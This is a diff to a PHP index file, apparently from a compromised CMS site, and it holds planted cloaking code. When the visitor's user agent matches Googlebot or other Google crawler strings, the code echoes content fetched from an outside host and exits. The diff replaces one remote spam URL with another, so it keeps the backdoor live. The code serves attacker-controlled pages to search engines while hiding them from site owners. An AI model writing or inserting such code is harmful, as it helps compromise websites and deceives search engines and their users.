@@ -3,10 +3,9 @@ function check_user_agent($agent) {
     return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
 }
 if (check_user_agent('Googlebot')  check_user_agent('Google-Site-Verification')  check_user_agent('Google-InspectionTool')) 
-{ echo file_get_contents('https://rakun.live/landing/globalpunet.txt');
+{ echo file_get_contents('https://script-kita.site/ugedu/r');
 exit;
 }
-
 
 /**
  * @defgroup index Index
